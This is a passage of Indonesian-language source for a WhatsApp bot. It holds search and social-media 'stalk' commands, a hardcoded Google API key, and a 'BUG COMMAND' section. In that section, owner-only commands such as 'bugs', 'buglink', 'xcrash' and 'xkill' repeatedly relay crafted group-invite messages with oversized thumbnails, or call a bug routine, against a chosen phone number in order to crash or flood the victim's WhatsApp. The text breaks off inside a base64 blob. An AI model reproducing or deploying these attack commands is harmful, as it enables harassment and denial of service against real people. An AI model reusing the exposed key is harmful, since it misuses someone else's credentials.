              .then((action) => {
                reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
              })
              .catch((err) => {
                reply(err.message);
              });
            }
            break
             // === Search Menu

            case 'playstore':
            case 'pstore': {
              if (!text) return m.reply(`Contoh: ${cmd} whatsapp`);
              try {
                let loo = await fetchJson(`https://api.vreden.web.id/api/playstore?query=${text}`);
                let results = loo.result;

                if (!results.length) return m.reply('Tidak ada hasil ditemukan.');
                let gambar = results[0]?.img;
                let teks = results.map((yoo, i) => {
                  return `*${i + 1}. ${text.toUpperCase()}*
Developer: ${yoo.developer}
Rating: ${yoo.rate2}
Link: ${yoo.link}
Link Developer: ${yoo.link_dev}`;
                }).join('\n\n');
                await sock.sendMessage(m.chat, {
                  image: {
                    url: gambar
                  },
                  caption: teks
                }, {
                  quoted: fakeQuoted
                });
              } catch (err) {
                console.error(err);
                m.reply(err.toString());
              }
            }
            break

            case 'playstation':
            case 'pstation': {
              if (!text) return m.reply(`Contoh: ${cmd} Naruto`);
              try {
                let loo = await fetchJson(`https://fastrestapis.fasturl.cloud/search/playstation?query=${text}`);
                let gambar = loo.result[0]?.images;
                let teks = loo.result.map((yoo, i) => {
                  return `*${i + 1}. ${yoo.title.toUpperCase()}*
Link: ${yoo.link}`;
                }).join('\n\n');
                await sock.sendMessage(m.chat, {
                  image: {
                    url: gambar
                  },
                  caption: teks
                }, {
                  quoted: fakeQuoted
                });
              } catch (err) {
                console.error(err);
                m.reply(err.toString());
              }
            }
            break

            case 'google': {
              if (!text) return m.reply(`Contoh: ${cmd} lyrra`)
              const apiKey = 'AIzaSyAajE2Y-Kgl8bjPyFvHQ-PgRUSMWgBEsSk'
              const cx = 'e5c2be9c3f94c4bbb'
              const query = text
              const url = `https://www.googleapis.com/customsearch/v1?q=${query}&key=${apiKey}&cx=${cx}`
              fetch(url).then(response => response.json()).then(data => {
                if (data.items && data.items.length > 0) {
                  let teks = `Hasil pencarian Google: ${kapital(text)}\n\n`
                  data.items.forEach(item => {
                    teks += `• Judul: ${item.title}\n`
                    teks += `• Deskripsi: ${item.snippet}\n`
                    teks += `• Link: ${item.link}\n\n`
                  })
                  m.reply(teks)
                } else {
                  m.reply('Tidak ada hasil yang ditemukan')
                }
              }).catch(err => {
                m.reply('Terjadi kesalahan')
              })
            }
            break

            case 'chrome':
            case 'chromes':
            case 'chromesrc':
            case 'chromesearch': {
              if (!text) return m.reply(`Contoh: ${cmd} lyrra`);

              const {
                Chrome
              } = require('./lib-signal/data-utils/scrape')
              Chrome(text).then(results => {
                if (results.length > 0) {
                  let hasil = '';

                  results.forEach(item => {
                    hasil += `• Judul: ${item.title}\n` +
                      `• Publisher: ${item.publisher}\n` +
                      `• Rating: ${item.rating} (${item.ratingCount} ulasan)\n` +
                      `• Link: ${item.link}\n\n`;
                  });

                  try {
                    sock.sendMessage(
                      m.chat, {
                        image: {
                          url: results[0].imgSrc
                        },
                        caption: hasil
                      }, {
                        quoted: fakeQuoted
                      }
                    );
                  } catch (err) {
                    m.reply(hasil);
                  }
                } else {
                  m.reply('Terjadi kesalahan')
                }
              }).catch(err => {
                m.reply('Terjadi kesalahan: ' + err.message);
              })
            }
            break

            case 'gimage': {
              if (!text) return m.reply(`Contoh: ${cmd} lyrra`)
              xreact()

              try {
                const {
                  gimage
                } = require('./lib-signal/data-utils/scrape')
                const images = await gimage(text)
                if (!images.length) return m.reply('Gambar tidak ditemukan')

                const randomImage = images[Math.floor(Math.random() * images.length)].link

                const buttons = [{
                  buttonId: `${_p}gimage ${text}`,
                  buttonText: {
                    displayText: 'Next'
                  },
                  type: 1
                }]

                await sock.sendMessage(m.chat, {
                  image: {
                    url: randomImage
                  },
                  caption: 'Lanjut mencari gambar yang sama? Klik tombol *Next* dibawah ini',
                  buttons,
                  headerType: 1,
                  viewOnce: true
                }, {
                  quoted: fakeQuoted
                })
              } catch (err) {
                m.reply(`Terjadi kesalahan: ${err}`)
              }
            }
            break

            case 'bingsrc':
            case 'bingsearch': {
              try {
                if (!text) return m.reply(`Contoh: ${cmd} mbappe`)
                let {
                  data
                } = await axios.get(`https://fastrestapis.fasturl.link/search/bingsearch?ask=${text}`)
                if (!data.result || data.result.length === 0) return m.reply('Tidak ada hasil yang ditemukan.')

                let allResults = data.result.map(kep =>
                  `*Title:* ${kep.title}\n*Desc:* ${kep.description}\n*Link:* ${kep.link}`
                ).join('\n\n')

                m.reply(allResults)
              } catch (err) {
                m.reply('Terjadi kesalahan: ' + err)
              }
            }
            break

            case 'bingimg':
            case 'bingimage': {
              try {
                if (!text) return m.reply(`Contoh: ${cmd} mbappe`)
                let {
                  data
                } = await axios.get(`https://fastrestapis.fasturl.link/search/bingimage?ask=${text}`)
                if (!data.result || data.result.length === 0) return m.reply('Tidak ada gambar yang ditemukan.')

                let allResults = data.result.map(kep =>
                  `*Title:* ${kep.title}\n*Image:* ${kep.imageUrl}\n*Thumbnail:* ${kep.thumbnailUrl}\n*Page:* ${kep.pageUrl}`
                ).join('\n\n')

                m.reply(allResults)
              } catch (err) {
                m.reply('Terjadi kesalahan: ' + err)
              }
            }
            break

            case 'bingvd':
            case 'bingvidio':
            case 'bingvideo': {
              try {
                if (!text) return m.reply(`Contoh: ${cmd} mbappe`)
                let results = await fetchJson(`https://vapis.my.id/api/bingsrc?q=${text}`)
                let allResults = results.data.map(kep => {
                  return `Judul: ${kep.title}\nDurasi: ${kep.duration}\nPenonton: ${kep.views}\nChannel: ${kep.channel}\nLink: ${kep.link}\n`
                }).join('\n')

                sock.sendMessage(m.chat, {
                  text: allResults
                }, {
                  quoted: fakeQuoted
                })
              } catch (err) {
                m.reply('Terjadi kesalahan: ' + err)
                console.error('Error:', err)
              }
            }
            break

            case 'yts':
            case 'ytsearch': {
              if (!text) return m.reply(`Contoh: ${cmd} aku yang tersakiti`)
              try {
                xreact()
                let results = await yt_search(text)
                if (!results.length) return m.reply('Tidak ditemukan hasil untuk pencarianmu.')

                let teks = `*YOUTUBE - SEARCH*\n\nHasil pencarian untuk: *${kapital(text)}*\n\n`
                for (let i = 0; i < results.length && i < 10; i++) {
                  let vid = results[i]
                  teks += `🎬 *${vid.title}*\n`
                  teks += `👤 Channel: ${vid.author}\n`
                  teks += `⏱️ Durasi: ${vid.duration}\n`
                  teks += `📅 Upload: ${vid.ago}\n`
                  teks += `👁️ Views: ${toRupiah(vid.views)}\n`
                  teks += `🔗 Link: ${vid.url}\n\n`
                }

                sock.sendMessage(m.chat, {
                  image: {
                    url: results[0].thumbnail
                  },
                  caption: teks
                }, {
                  quoted: fakeQuoted
                })
              } catch (err) {
                console.error(err)
                m.reply(`Terjadi kesalahan saat mencari video.\n\n${err.message}`)
              }
            }
            break
            
            /* STALK MENU*/
            case 'stalkig':
            case 'instagramstalk':
            case 'stalkinstagram':
            case 'igstalk': {
    if (!text) return reply(`Masukkan username Instagram!\nContoh: ${prefix}igstalk ryzz2.009`);
    
    try {
        let username = text;
        let res = await fetch(`https://api.zenzxz.my.id/api/stalker/instagram?username=${username}`);
        let json = await res.json();

        if (!json.success) return reply(`User tidak ditemukan!`);

        let data = json.data;
        let caption = `
*Instagram Stalker Info*
• Username: ${data.username}
• Name: ${data.name}
• Bio: ${data.bio || '-'}
• Followers: ${data.followers}
• Following: ${data.following}
• Posts: ${data.posts}
• Verified: ${data.verified ? '✅' : '❌'}
• Engagement Rate: ${data.engagement_rate}
`;

        // Kirim foto profil dengan info
        await sock.sendMessage(m.chat, {
            image: { url: data.profile_pic },
            caption: caption
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengambil data Instagram.');
    }
}
break;
case 'stalkroblox':
case 'robloxstalk': {
    if (!text) return reply(`Masukkan username Roblox!\nContoh: ${prefix}robloxstalk KACUNG`);

    try {
        let username = text;
        let res = await fetch(`https://api.zenzxz.my.id/api/stalker/roblox?user=${username}`);
        let json = await res.json();

        if (!json.success) return reply('User Roblox tidak ditemukan!');

        let data = json.data;
        let basic = data.basic;
        let presence = data.presence.userPresences[0] || {};
        let social = data.social;
        let avatar = data.avatar.headshot.data[0]; // pakai headshot sebagai thumbnail

        let caption = `
*Roblox User Info*
• Name: ${basic.name}
• Display Name: ${basic.displayName}
• User ID: ${basic.id}
• Description: ${basic.description || '-'}
• Created: ${new Date(basic.created).toLocaleDateString()}
• Banned: ${basic.isBanned ? '✅' : '❌'}
• Verified: ${basic.hasVerifiedBadge ? '✅' : '❌'}
• Last Location: ${presence.lastLocation || '-'}
• Friends: ${social.friends.count}
• Followers: ${social.followers.count}
• Following: ${social.following.count}
`;

        // Kirim foto avatar headshot dengan info
        await sock.sendMessage(m.chat, {
            image: { url: avatar.imageUrl },
            caption: caption
        });
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengambil data Roblox.');
    }
}
break;
case 'twiterstalk':
case 'stalktwiter':
case 'stalktw':
case 'twstalk': {
    if (!text) return reply(`Masukkan username Twitter!\nContoh: ${prefix}twstalk ale`);
    
    try {
        let username = text;
        let res = await fetch(`https://api.zenzxz.my.id/api/stalker/twitter?username=${username}`);
        let json = await res.json();

        if (!json.success) return reply('User Twitter tidak ditemukan!');

        let user = json.data.user;
        let tweets = json.data.tweetList.tweets.slice(0, 5); // ambil 5 tweet terbaru
        let caption = `
*Twitter Stalker Info*
• Name: ${user.name}
• Username: @${user.screen_name}
• Bio: ${user.description || '-'}
• Verified: ${user.is_blue_verified ? '✅' : '❌'}
`;

        // Tambahkan daftar tweet terbaru
        caption += `\n*Latest Tweets:*\n`;
        tweets.forEach((t, i) => {
            caption += `\n${i + 1}. ${t.full_text}\nRetweets: ${t.retweet_count}, Likes: ${t.favorite_count}\n`;
        });

        // Kirim foto profil dengan info
        await sock.sendMessage(m.chat, {
            image: { url: user.profile_image_url_https },
            caption: caption
        });

    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengambil data Twitter.');
    }
}
break;
case 'stalkyt':
case 'ytstalk':
case 'youtubestalk':
case 'stalkyoutube': {
    if (!text) return reply(`Masukkan username YouTube!\nContoh: ${prefix}ytstalk alex`);
    
    try {
        let username = text;
        let res = await fetch(`https://api.zenzxz.my.id/api/stalker/youtube?username=${username}`);
        let json = await res.json();

        if (!json.success) return reply('User YouTube tidak ditemukan!');

        let channel = json.data.channel;
        let latest = json.data.latest_videos;

        let caption = `
*YouTube Stalker Info*
• Username: ${channel.username}
• Subscribers: ${channel.subscriberCount || '-'}
• Videos: ${channel.videoCount || '-'}
• Description: ${channel.description || '-'}
• Channel URL: ${channel.channelUrl}
`;

        if (latest.length > 0) {
            caption += `\n*Latest Videos:*\n`;
            latest.slice(0, 5).forEach((vid, i) => {
                caption += `\n${i + 1}. ${vid.title}\n${vid.url}\n`;
            });
        } else {
            caption += `\nTidak ada video terbaru.`;
        }

        // Kirim foto avatar dengan info
        await sock.sendMessage(m.chat, {
            image: { url: channel.avatarUrl },
            caption: caption
        });

    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat mengambil data YouTube.');
    }
}
break;

        //▢━━━━━━━━━「 BUG COMMAND 」━━━━━━━━━▢
        
        case 'bugs': {
          if (!isOwner) return reply(mess.owner)
          Pe = m.chat
          if (global.owner.includes(Pe)) return m.reply('Tidak Dapat Melakukannya Kepada Owner')
          try {
            var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
              "groupInviteMessage": {
                "groupJid": "6288239620884-1626256984@g.us",
                "inviteCode": "sfeVFOlWvlo5Hd9x",
                "inviteExpiration": "166659839399999",
                "groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️`,
                "jpegThumbnail": "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",
                "caption": `${command}\n*https://wa.me/settings*\n${botName}`,
              }
            }), {
              userJid: Pe,
              quoted: m
            })
            if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
            jumlah = `${encodeURI(q)}`
            for (let i = 0; i < jumlah; i++) {
              sock.relayMessage(Pe, groupInvite.message, {
                messageId: groupInvite.key.id
              })
              await sleep(2000)
            }
          } catch (err) {
            m.reply('Terjadi kesalahan: ' + err)
          }
        }
        break
        case "xvir":
        case 'xstik':
        case "xlist":
        case "xbutton":
        case "x24j":
        case "xuia":
        case "xlec":
        case "xforce":
        case "xva":
        case "xta":
        case "xcrash":
        case "xbom":
        case "xbug":
        case "xkill":
        case "xloc":
        case "xdoc":
        case 'xhit': {
          if (!isOwner) return reply(mess.owner)
          let good = text.split(',');
          if (good.length < 2) return m.reply(`*Masukan Input Dengan Benar!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          if (isNaN(good[0])) return m.reply(`*Nomor Harus Berupa Angka!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          if (!good[0]) return m.reply(`*Masukan Nombor!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          if (!good[1]) return m.reply(`*Masukan Jumlah Yang Dikirim!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          if (isNaN(good[1])) return m.reply(`*Jumlah Bug Harus Berupa Angka!*\n\n*Cara :*\n${prefix + command} nombor,jumlah\n\n*Contoh :*\n${prefix + command} 628xxx,5\n\n`)
          let onlen = await sock.onWhatsApp(good[0])
          if (onlen.length == 0) return m.reply('*Nomor Tersebut Tidak Ada Di WhatsApp!*')
          try {
            m.reply(`*[ </> ]* Mengirimkan ${command}...`)
            await sleep(1000)
            sockbug(onlen[0].jid, good[1])
            await sleep(2000)
            m.reply(`*[ </> ]* Done sent!`)
          } catch (err) {
            m.reply('Terjadi kesalahan: ' + err)
          }
        }
        break

        case '🌷':
        case '🐲':
        case '🐉':
        case '🌵':
        case '🎄':
        case '🌲':
        case '🌳':
        case '🌱':
        case '🌿':
        case '🍀':
        case '☘️':
        case 'buglink': {
          if (!isOwner) return reply(mess.owner)
          if (!args[0]) return m.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx`)
          Pe = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
          if (global.owner.includes(Pe)) return m.reply('Tidak Dapat Melakukannya Kepada Owner')
          try {
            var groupInvite = generateWAMessageFromContent(Pe, proto.Message.fromObject({
              "groupInviteMessage": {
                "groupJid": "6288239620884-1626256984@g.us",
                "inviteCode": "sfeVFOlWvlo5Hd9x",
                "inviteExpiration": "166659839399999",
                "groupName": `𝑪𝑶𝑴𝑼𝑵𝑰𝑻𝒀 𝑪𝑳𝑨𝒀(𝑪𝒍𝒐𝒘𝒏𝒔 𝑳𝒂𝒖𝒈𝒉 𝑨𝒕 𝒀𝒐𝒖)©️${(prefix)}`,
                "jpegThumbnail": "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